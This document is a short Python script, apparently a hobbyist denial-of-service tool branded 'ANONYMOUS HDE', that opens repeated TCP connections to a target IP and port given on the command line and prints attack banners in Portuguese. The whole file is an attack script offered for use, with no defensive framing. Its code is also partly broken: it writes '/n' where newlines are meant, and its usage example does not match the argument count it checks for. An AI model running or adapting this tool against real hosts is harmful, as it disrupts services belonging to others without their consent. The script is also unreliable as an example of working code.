import socket
import sys
import os

main = """

O J O

ANONYMOUS HDE
============
ATAQUE DOS
_-_-_-_-_-_-_
-------------

Powered HDE/n/n"""
count = 0

def init(ip, port, main):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.settimeout(0.03)
	code = client.connect_ex((ip, int(port)))
	if code == 0:
		print(" ====== ATACANDO ======")
		print("IP: "+ip+" PORT: "+port)
		print("   ANONYMOUS HDE HACKS")
	else:
		print("SERVIDOR INDISPONIVEL OU PORTA FECHADA!/n")

if len(sys.argv) < 4:
	print('/n/n')
	print("Modo de Uso:")
	print("Exe: root@localhost~# python DosHDE.py 192.168.0.1 80")
	print("/n/n")
	sys.exit(0)
else:
	ip = sys.argv[1]
	port = sys.argv[2]
	quantia = int(sys.argv[3])
	while count < quantia:
		count+=1
		init(ip, port, main)
	print(" DoS Parado")
